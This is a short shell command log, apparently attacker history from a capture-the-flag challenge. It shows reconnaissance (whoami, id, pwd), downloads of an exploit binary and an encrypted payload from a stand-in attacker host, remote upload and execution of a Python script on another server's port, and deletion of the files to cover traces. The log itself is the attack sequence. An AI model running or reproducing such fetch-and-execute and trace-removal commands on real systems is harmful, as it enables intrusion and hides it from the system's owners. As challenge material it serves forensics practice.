whoami
id
pwd
wget http://hackerserver.doesnt.exist/exploit_x64
chmod +x exploit_x64
wget http://hackerserver.doesnt.exist/payload
decrypt payload > prs.py
./exploit_x64 --server hiddenclues.sstf.site --port 13579 --upload "prs.py"
./exploit_x64 --server hiddenclues.sstf.site --port 13579 --run "python prs.py" --remote_port 24680
rm -rf exploit_x64 prs.py
exit
